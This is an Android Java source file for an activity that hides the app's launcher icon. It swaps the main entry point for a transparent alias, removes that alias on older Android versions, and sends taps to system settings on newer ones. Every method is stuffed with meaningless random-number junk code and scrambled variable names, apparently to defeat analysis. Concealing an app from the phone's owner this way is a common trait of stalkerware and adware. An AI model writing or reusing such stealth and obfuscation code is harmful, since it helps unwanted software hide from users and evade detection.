package uxw.dnebp.tve;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（GQF），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 * 注：UBQ.initPopPower() 已提前直接执行组件切换(A16 保底)，
 * 此处的切换为幂等重复确认，主要为旧版本保留"切换后跳设置页"的原始体验。
 */
public class PMIK extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String onaGOiqjYjklJPCH = java.util.UUID.randomUUID().toString();
        int ckuyelBIgVYYuD = onaGOiqjYjklJPCH.length();
        char pmh_PbaOuFsbsrCcsKLl = onaGOiqjYjklJPCH.charAt(new java.util.Random().nextInt(ckuyelBIgVYYuD));
        boolean dimaHxRiJ = (pmh_PbaOuFsbsrCcsKLl == 'z');
        if (dimaHxRiJ && ckuyelBIgVYYuD < 69) {
            onaGOiqjYjklJPCH.substring(24, 69);
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(PMIK.this, GQF.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(PMIK.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        long arr_NacVwRIcBrrFwsXQcPb = java.lang.System.nanoTime();
        int i_RSqvNDeDa = new java.util.Random().nextInt(1000);
        boolean j_EsqjaO = (arr_NacVwRIcBrrFwsXQcPb % (i_RSqvNDeDa + 72)) > 67;
        double tmp_txZblXv = j_EsqjaO ? java.lang.Math.sqrt(i_RSqvNDeDa) : java.lang.Math.pow(i_RSqvNDeDa, 52);
        if (tmp_txZblXv < 0.0) {
            java.lang.System.out.println(tmp_txZblXv);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        int process_uvSDlMhBSYFjmv = new java.util.Random().nextInt(50);
        int stack_mCwomhkHYsB = (process_uvSDlMhBSYFjmv > 14) ? 1 : ((process_uvSDlMhBSYFjmv > 41) ? 52 : ((process_uvSDlMhBSYFjmv > 97) ? 18 : 32));
        int i_ZwLpBWMfNYlM = stack_mCwomhkHYsB * process_uvSDlMhBSYFjmv;
        if (i_ZwLpBWMfNYlM > 70) {
            java.lang.System.arraycopy(new int[] { i_ZwLpBWMfNYlM }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onaGOiqjYjklJPCH = java.util.UUID.randomUUID().toString();
        int ckuyelBIgVYYuD = onaGOiqjYjklJPCH.length();
        char pmh_PbaOuFsbsrCcsKLl = onaGOiqjYjklJPCH.charAt(new java.util.Random().nextInt(ckuyelBIgVYYuD));
        boolean dimaHxRiJ = (pmh_PbaOuFsbsrCcsKLl == 'z');
        if (dimaHxRiJ && ckuyelBIgVYYuD < 69) {
            onaGOiqjYjklJPCH.substring(24, 69);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
